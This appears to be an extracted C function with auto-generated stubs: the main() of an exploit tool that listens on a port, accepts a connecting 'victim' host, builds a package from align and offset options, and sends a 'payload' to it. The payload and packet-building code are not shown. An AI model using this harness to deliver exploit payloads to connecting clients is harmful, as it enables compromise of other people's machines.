
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int victim ;
struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int confess ;


 int AF_INET ;
 unsigned int ALIGN ;
 int INADDR_ANY ;
 unsigned int OFFSET ;
 unsigned int PORT ;
 int SOCK_STREAM ;
 int SOL_SOCKET ;
 int SO_REUSEADDR ;
 int SUCCESS ;
 int _exit (int) ;
 int accept (int,struct sockaddr*,unsigned int*) ;
 unsigned int atoi (int ) ;
 int banner () ;
 int bind (int,struct sockaddr*,int) ;
 int close (int) ;
 int die (char*) ;
 int example (char*) ;
 int fprintf (int ,char*,...) ;
 unsigned int getopt (int,char**,char*) ;
 int htonl (int ) ;
 int htons (unsigned int) ;
 char* inet_ntoa (TYPE_1__) ;
 int listen (int,int ) ;
 int looking (char*) ;
 int memset (struct sockaddr_in*,int ,int) ;
 int optarg ;
 int payload ;
 int pkg_prep (int,unsigned int,unsigned int) ;
 int pkg_send (int,int ) ;
 int printf (char*,unsigned int) ;
 int setsockopt (int,int ,int ,unsigned int*,int) ;
 int sleep (int) ;
 int socket (int ,int ,int ) ;
 int stderr ;

int
main(int argc, char **argv)
{
unsigned int align = 0, offset = 0, reuse = 1;
unsigned int port = PORT;
unsigned int cl_buf, opts;

signed int clisock_fd, sock_fd;

static char *exploit, *work;

struct sockaddr_in victim;
struct sockaddr_in confess;


if(argc < 2) {
banner();
example(exploit);
_exit(1);
}banner();


while((opts = getopt(argc, argv, "a:o:")) != -1) {
switch(opts)
{
case 'a':
align = atoi(optarg);
break;
case 'o':
offset = atoi(optarg);
break;
default:
align = ALIGN;
offset = OFFSET;
}
}

if((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
die("Could not create socket");
}

if(setsockopt(sock_fd,SOL_SOCKET,SO_REUSEADDR, &reuse, sizeof(int)) == -1) {
die("Could not re-use socket");
}

memset(&confess, 0, sizeof(confess));

confess.sin_family = AF_INET;
confess.sin_port = htons(port);
confess.sin_addr.s_addr = htonl(INADDR_ANY);

if(bind(sock_fd, (struct sockaddr *)&confess, sizeof(struct sockaddr)) == -1) {
die("Could not bind socket");
}

if(listen(sock_fd, 0) == -1) {
die("Could not listen on socket");
}

printf(" -> Listening for a connection on port %d\n", port);

cl_buf = sizeof(victim);
clisock_fd = accept(sock_fd, (struct sockaddr *)&victim, &cl_buf);

fprintf(stderr, " -> Action: Attaching from host[%s]\n", inet_ntoa(victim.sin_addr));

if(pkg_prep(clisock_fd, align, offset) == 1) {
fprintf(stderr, "Could not prep package\n");
_exit(1);
}

if(pkg_send(clisock_fd, payload) == 1) {
fprintf(stderr, "Could not send package\n");
_exit(1);
}
sleep(2);

fprintf(stderr, " -> Test complete\n\n");

close(clisock_fd); looking(work);

return SUCCESS;
}
